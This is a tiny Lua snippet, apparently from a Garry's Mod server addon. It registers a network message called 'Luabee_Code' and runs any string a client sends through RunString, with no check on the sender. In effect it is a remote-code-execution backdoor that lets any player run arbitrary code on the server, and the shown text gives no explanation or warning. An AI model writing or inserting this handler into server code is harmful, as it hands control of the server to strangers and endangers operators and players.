
util.AddNetworkString("Luabee_Code")
net.Receive("Luabee_Code", function(len,ply)
	RunString(net.ReadString())
end)
